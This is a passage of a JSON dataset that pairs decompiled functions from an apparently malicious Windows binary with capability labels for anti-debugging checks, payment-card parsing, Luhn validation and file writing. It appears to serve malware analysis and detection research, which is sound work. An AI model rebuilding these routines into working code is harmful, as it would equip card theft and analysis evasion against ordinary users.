        "decompiled_code": "\nuint __cdecl fcn.00402f80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    var_4h = fcn.004049b0(arg_18h, arg_1ch, 0x4110ac, 7);\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    if (var_4h == NULL) {\n        return 0;\n    }\n    var_24h = 0;\n    puVar4 = &var_23h;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    uVar5 = 0;\n    do {\n        uVar2 = (*pcVar1)();\n        (&var_24h)[uVar5] = uVar2;\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x20);\n    puVar4 = &var_24h;\n    puVar6 = var_4h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    fcn.00402420(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n    fcn.004020e0(arg_18h, arg_1ch);\n    return 1;\n}\n",
        "token_count": 477
    },
    "00403250": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403250(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00402d20();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(*0x10 + -0x110, 4);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00403870();\n        arg_ch_01 = fcn.00403870();\n        arg_ch_02 = fcn.00403870();\n        fcn.00403dd0(arg_10h, arg_ch_00);\n        fcn.00403dd0(arg_8h, arg_ch_01);\n        fcn.00403dd0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x41107c, &lpBuffer, arg_10h);\n        iVar2 = fcn.00404e30(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x411088, &lpBuffer, arg_8h);\n            iVar2 = fcn.00404e30(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x411088, &lpBuffer, arg_ch);\n                iVar2 = fcn.00404e30(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00403dd0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 617
    },
    "004036a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040379a) overlaps instruction at (ram,0x00403799)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004036a0(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    uint8_t uVar4;\n    char cVar5;\n    int32_t in_EAX;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    int32_t *in_ECX;\n    int32_t *piVar9;\n    int32_t *extraout_ECX;\n    char *in_EDX;\n    char *extraout_EDX;\n    uint unaff_EBX;\n    uint *puVar10;\n    uint *unaff_ESI;\n    uint *puVar11;\n    uint *puVar12;\n    uint *unaff_EDI;\n    uint *puVar13;\n    int32_t *piVar14;\n    bool in_PF;\n    uint8_t in_AF;\n    bool bVar15;\n    uint uStack17;\n    uchar uStack13;\n    uchar uStack12;\n    ushort uStack11;\n    uchar uStack9;\n    int32_t *var_4h;\n    \n    uStack12 = unaff_EBX;\n    uStack11 = unaff_EBX >> 8;\n    uStack9 = unaff_EBX >> 0x18;\n    uStack17._1_3_ = SUB43(unaff_ESI, 0);\n    uStack13 = unaff_ESI >> 0x18;\n    uStack17._0_1_ = unaff_EDI >> 0x18;\n    uVar4 = uStack17;\n    puVar11 = arg_8h;\n    if ((!in_PF) && (in_PF)) {\n        out(*unaff_ESI, in_EDX);\n        do {\n            cVar5 = in_EAX >> 8;\n            in_AF = 9 < (in_EAX & 0xf) | in_AF;\n            in_EAX = CONCAT31(CONCAT21(in_EAX >> 0x10, cVar5 - in_AF), -in_AF);\n        } while (in_AF || cVar5 == *in_EDX);\n        piVar9 = unaff_EDI + in_EDX * 2;\n        *piVar9 = (*piVar9 + 0x7b) - in_AF;\n        iVar8 = *piVar9;\n        *(in_ECX + -0x75) = in_EAX;\n        puVar11 = unaff_ESI + 1;\n        if (iVar8 != 0) {\n            *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e);\n            return in_EAX;\n        }\n    }\n    if (*puVar11 != 0x5a4d) {\n        return 0;\n    }\n    var_4h = in_ECX;\n    if ((*puVar11 < 0x5a4d) || (0x5a4c < *puVar11)) {\n        piVar9 = puVar11[0xf] + puVar11;\n    }\n    else {\n        cVar5 = puVar11;\n        pcVar3 = swi(4);\n        piVar9 = in_ECX;\n        puVar11 = in_EAX + -1;\n        if (SBORROW1(cVar5, '\\x03') == true) {\n            (*pcVar3)();\n            piVar9 = extraout_ECX;\n            in_EDX = extraout_EDX;\n        }\n    }\n    if (*piVar9 != 0x4550) {\n        return 0;\n    }\n    uVar6 = piVar9[0x16];\n    if (uVar6 != 0) {\n        return 0;\n    }\n    puVar10 = 0x40;\n    if ((-1 < uVar6) && (-1 >= uVar6)) {\n        *0x40 = *0x40 & 0xc3;\n        uVar2 = 9 < (puVar11 & 0xf) | in_AF;\n        uVar6 = puVar11 & 0xffff0000 | CONCAT11((puVar11 >> 8) - uVar2, puVar11 + uVar2 * -6) & 0xff0f;\n        puVar11 = 0xe40ce22a;\n    }\n    bVar15 = puVar11[0xf] == 0x80;\n    if (puVar11[0xf] < 0x81) {\n        return 0;\n    }\n    puVar13 = unaff_EDI;\n    if (bVar15) {\ncode_r0x0040379a:\n        puVar11 = puVar11[0xf];\n        if (puVar11 < 0xc0) {\ncode_r0x004037a5:\n            puVar10 = puVar11 + -0x20;\n        }\n        uStack13 = SUB41(puVar10, 0);\n        uStack12 = puVar10 >> 8;\n        uStack11 = puVar10 >> 0x10;\n        uStack17 = 0x4037c8;\n        var_4h = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n        if (var_4h == NULL) {\n            return 0;\n        }\n        puVar11 = NULL;\n        uStack17 = puVar13;\n        if (puVar10 == NULL) goto code_r0x00403823;\n    }\n    else {\n        uStack17 = CONCAT31(uStack17._1_3_, uVar4);\n        puVar12 = unaff_EDI & 0xffffff | uVar4 << 0x18;\n        puVar13 = puVar12;\n        if (!bVar15) goto code_r0x0040379a;\n        puVar13 = puVar12 + 1;\n        uVar1 = in(in_EDX);\n        *puVar12 = uVar1;\n        if (0 < &stack0xfffffff0) {\n            uVar6 = uVar6 ^ 0xdee0ed6d;\n            puVar7 = uVar6 & 0xffff0000 | uVar6 + (uVar6 >> 8) * -0x31;\n            *0xfe813cb6 = *0xfe813cb6 ^ unaff_EDI;\n            *puVar7 = *puVar7;\n            *0x43 = *0x43 + (in_EDX >> 8);\n            goto code_r0x004037a5;\n        }\n    }\n    do {\n        puVar13 = uStack17;\n        uStack13 = 0xf;\n        uStack12 = 0x38;\n        uStack11 = 0x40;\n        iVar8 = (*_sym.imp.MSVCRT.dll_rand)();\n        puVar12 = puVar11 + 1;\n        *(puVar11 + var_4h) = iVar8 % 0xff;\n        puVar11 = puVar12;\n        uStack17 = puVar13;\n    } while (puVar12 < puVar10);\ncode_r0x00403823:\n    piVar9 = var_4h;\n    piVar14 = arg_8h + 0x20;\n    for (uVar6 = puVar10 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *piVar14 = *piVar9;\n        piVar9 = piVar9 + 1;\n        piVar14 = piVar14 + 1;\n    }\n    for (uVar6 = puVar10 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *piVar14 = *piVar9;\n        piVar9 = piVar9 + 1;\n        piVar14 = piVar14 + 1;\n    }\n    uStack13 = SUB41(var_4h, 0);\n    uStack12 = var_4h >> 8;\n    uStack11 = var_4h >> 0x10;\n    uStack17 = 0x403856;\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n    return 1;\n}\n",
        "token_count": 1825
    },
    "004039a0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004039a0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    bool bVar4;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    bVar3 = false;\n    bVar4 = true;\n    fcn.00403890(&var_68h, &var_4h);\n    if ((!bVar3 && !bVar4) && (bVar3 || bVar4)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.004022b0(&var_68h, var_4h, 0x4114e8, 0x11000);\n    *arg_8h = 0x4114e8;\n    *arg_ch = 0x11000;\n    return;\n}\n",
        "token_count": 314
    },
    "004040d0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004040d0(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    bool bVar7;\n    uint8_t in_IF;\n    bool bVar8;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t hLibModule;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    bVar8 = false;\n    var_4h = 0xffffffff;\n    uStack12 = 0x405050;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x411450);\n    bVar7 = iVar1 == 0;\n    if (bVar7) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    hLibModule = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x41145c);\n    if ((!bVar7) && (bVar7)) {\n        bVar8 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n    }\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &lpdwResult);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x411470);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar1 = (*pcVar3)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar1 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar1 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((-1 < iVar1) && (var_24h != NULL)) {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar1 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar1 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00404502:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x0040450e:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar1 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar1 < 0) || (var_10h == NULL)) ||\n                       (iVar1 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar1 < 0)) {\njoined_r0x004044c9:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x0040450e;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00404305:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00403ee0(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x411484);\n                        if (iVar4 != 0) goto joined_r0x00404305;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar1 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar1 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x004044ae:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00404502;\n                        }\n                        iVar1 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar4 = var_3ch;\n                        if (iVar1 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x004044ae;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + bVar8 * -2 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + bVar8 * -4 + 2) = 0;\n                            fcn.00403ee0(iVar4, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar4 = fcn.00404010(&var_148h);\n                            if (iVar4 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x004044c9;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n        }\n        if (var_24h != NULL) {\n            var_4h = var_4h._1_3_ << 8;\n            (**(*var_24h + 8))(var_24h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar1;\n}\n",
        "token_count": 2427
    },
    "00404950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404950(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00402e30;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x4224e8;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 219
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401000(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar1 = fcn.004030d0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 70
    },
    "004011f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004011f0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 147
    },
    "00401bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401cd2) overlaps instruction at (ram,0x00401ccf)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __fastcall fcn.00401bf0(uint32_t param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint8_t extraout_CH;\n    uint8_t extraout_CH_00;\n    int32_t extraout_ECX;\n    char extraout_CH_01;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    int32_t iVar7;\n    int32_t extraout_EDX;\n    uint extraout_EDX_00;\n    uint32_t unaff_EBX;\n    uint *puVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool bVar11;\n    bool bVar12;\n    uchar uVar13;\n    bool in_SF;\n    char cVar14;\n    bool bVar15;\n    char cVar16;\n    ulong uVar17;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    int32_t arg_14h;\n    ushort in_stack_ffffffe8;\n    ushort uVar18;\n    ushort in_stack_ffffffea;\n    ushort uVar19;\n    ushort in_stack_ffffffec;\n    ushort uVar20;\n    ushort in_stack_ffffffee;\n    ushort uVar21;\n    ushort in_stack_fffffff0;\n    ushort uVar22;\n    ushort in_stack_fffffff2;\n    ushort uVar23;\n    \n    if ((in_SF) || (param_1 = param_1 & 0xffff,  !in_SF)) {\n        in_stack_fffffff0 = 0x20;\n        in_stack_fffffff2 = 0;\n        in_stack_ffffffec = 0x13e4;\n        in_stack_ffffffee = 0x41;\n        in_stack_ffffffe8 = 0x15;\n        in_stack_ffffffea = 0;\n    }\n    in(0x13);\n    *(param_2 + 0x15) = *(param_2 + 0x15) + (param_1 + 1 >> 8);\n    fcn.00401030(0x411050, CONCAT22(in_stack_ffffffea, in_stack_ffffffe8), \n                 CONCAT22(in_stack_ffffffee, in_stack_ffffffec), CONCAT22(in_stack_fffffff2, in_stack_fffffff0));\n    bVar11 = false;\n    uVar17 = fcn.00401030(0x411050, 0x15, 0x411404, 0x26);\n    iVar7 = uVar17 >> 0x20;\n    if ((bVar11) || (arg_14h = iVar7,  !bVar11)) {\n        arg_14h = 8;\n        in_stack_ffffffdc = 0x41142c;\n        in_stack_ffffffd8 = 0x15;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n    puVar1 = uVar17 + (bVar11 == false) + 0x7c8ecb39;\n    *puVar1 = *puVar1 | extraout_CH;\n    pcVar2 = iVar7 + 0x15;\n    *pcVar2 = *pcVar2 + extraout_CH;\n    fcn.00401030(0x411050, in_stack_ffffffd8, in_stack_ffffffdc, arg_14h);\n    fcn.00401030(0x411050, 0x15, 0x411434, 0x19);\n    fcn.00401030(0x411050, 0x15, 0x411450, 0xb);\n    uVar22 = 0x12;\n    uVar23 = 0;\n    uVar20 = 0x145c;\n    uVar21 = 0x41;\n    uVar18 = 0x15;\n    uVar19 = 0;\n    while( true ) {\n        uVar17 = fcn.00401030(0x411050, CONCAT22(uVar19, uVar18), CONCAT22(uVar21, uVar20), CONCAT22(uVar23, uVar22));\n        bVar11 = false;\n        bVar15 = false;\n        bVar12 = ((uVar17 >> 0x20 & 0xffffff00 | extraout_CH_00) & uVar17) == 0;\n        uVar22 = 0x12;\n        uVar23 = 0;\n        uVar20 = 0x1470;\n        uVar21 = 0x41;\n        uVar18 = 0x1050;\n        uVar19 = 0x41;\n        fcn.00401030(0x411050, 0x411050, 0x411470, 0x12);\n        if ((bVar11 || bVar12) || (!bVar11 && !bVar12)) break;\n        if (!bVar15) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(extraout_EDX + 0x15) = *(extraout_EDX + 0x15) + (extraout_ECX + 1 >> 8);\n    }\n    uVar17 = fcn.00401030(0x411050, 0x15, 0x411484, 2);\n    puVar5 = uVar17;\n    if (!bVar11 && !bVar12) {\n        unaff_EBX = unaff_EBX & 0xffff00ff;\n    }\n    *unaff_EDI = *unaff_ESI;\n    pcVar2 = (uVar17 >> 0x20) + 0x15;\n    *pcVar2 = *pcVar2 + extraout_CH_01;\n    puVar5[-1] = 0x411050;\n    puVar5[-2] = 0x401d64;\n    uVar17 = fcn.00401030(puVar5[-1], *puVar5, puVar5[1], puVar5[2]);\n    puVar5[10] = uVar17;\n    puVar5[9] = extraout_ECX_00;\n    puVar5[8] = uVar17 >> 0x20;\n    bVar11 = (POPCOUNT(extraout_ECX_00 - 5U & 0x44) & 1U) == 0;\n    puVar5[10] = 8;\n    puVar5[9] = 0x411490;\n    puVar5[8] = 0x15;\n    puVar5[7] = 0x411050;\n    puVar5[6] = 0x401d9f;\n    fcn.00401030(puVar5[7], puVar5[8], puVar5[9], puVar5[10]);\n    if ((!bVar11) && (bVar11)) {\n        puVar10 = puVar5 + 6;\n        puVar5[6] = 0x6ae181d0;\n        puVar8 = 0x6ae181d0;\n        cVar14 = '\\x1e';\n        do {\n            puVar8 = puVar8 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar8;\n            cVar14 = cVar14 + -1;\n        } while ('\\0' < cVar14);\n        puVar5[-0x19] = puVar5 + 6;\n        uVar6 = in(0x78);\n        return uVar6;\n    }\n    puVar5[6] = 6;\n    puVar5[5] = 0x411498;\n    puVar5[4] = 0x15;\n    puVar5[3] = 0x411050;\n    puVar5[2] = 0x401dce;\n    uVar17 = fcn.00401030(puVar5[3], puVar5[4], puVar5[5], puVar5[6]);\n    puVar5[10] = uVar17;\n    puVar5[9] = extraout_ECX_01;\n    puVar5[8] = uVar17 >> 0x20;\n    puVar5[7] = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n    puVar5[6] = puVar5 + 0xb;\n    puVar5[5] = 0x6ae181d0;\n    puVar5[4] = unaff_ESI + 1;\n    puVar5[3] = unaff_EDI + 1;\n    iVar4 = uVar17;\n    cVar16 = SCARRY2(iVar4, 1);\n    cVar14 = iVar4 + 1 < 0;\n    uVar13 = iVar4 == -1;\n    puVar10 = puVar5[5];\n    uVar6 = puVar5[7];\n    puVar5[10] = 7;\n    puVar5[9] = 0x4114a0;\n    puVar5[8] = 0x15;\n    puVar5[7] = 0x411050;\n    puVar5[6] = 0x401deb;\n    fcn.00401030(puVar5[7], puVar5[8], puVar5[9], puVar5[10]);\n    if ((!cVar16) && (puVar5[6] = extraout_EDX_00,  cVar16)) {\n        uVar6 = puVar5[0xe];\n        *puVar5[7] = uVar6;\n        return uVar6;\n    }\n    puVar5[6] = 7;\n    puVar5[5] = 0x4114a8;\n    puVar5[4] = 0x15;\n    puVar5[3] = 0x411050;\n    puVar5[2] = 0x401e1e;\n    fcn.00401030(puVar5[3], puVar5[4], puVar5[5], puVar5[6]);\n    puVar8 = puVar5 + 3;\n    if ((!uVar13) && (puVar8 = puVar5 + 3,  uVar13)) {\n        puVar8 = puVar5 + 2;\n        puVar5[2] = puVar10;\n        cVar3 = '\\x10';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *puVar10;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n        puVar5[-0xf] = puVar5 + 2;\n        puVar8 = puVar5 + -0x5e57;\n    }\n    *(puVar8 + -4) = 6;\n    *(puVar8 + -8) = 0x4114b0;\n    *(puVar8 + -0xc) = 0x15;\n    puVar9 = puVar8 + -0x10;\n    *(puVar8 + -0x10) = 0x411050;\n    *(puVar8 + -0x14) = 0x401e40;\n    fcn.00401030(*(puVar8 + -0x10), *(puVar8 + -0xc), *(puVar8 + -8), *(puVar8 + -4));\n    if ((uVar13 || cVar16 != cVar14) || (!uVar13 && cVar16 == cVar14)) {\n        puVar9 = puVar8 + -0x14;\n        *(puVar8 + -0x14) = 0x25;\n    }\n    puVar9[-1] = 0x4114b8;\n    puVar9[-2] = 0x15;\n    puVar9[-3] = 0x411050;\n    puVar9[-4] = 0x401e61;\n    fcn.00401030(puVar9[-3], puVar9[-2], puVar9[-1], *puVar9);\n    puVar9[0xc] = uVar6;\n    puVar9[0xc] = 8;\n    puVar9[0xb] = 0x4114e0;\n    puVar9[10] = 0x15;\n    puVar9[9] = 0x411050;\n    puVar9[8] = 0x401e7c;\n    uVar6 = fcn.00401030(puVar9[9], puVar9[10], puVar9[0xb], puVar9[0xc]);\n    return uVar6;\n}\n",
        "token_count": 2951
    },
    "00401e90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
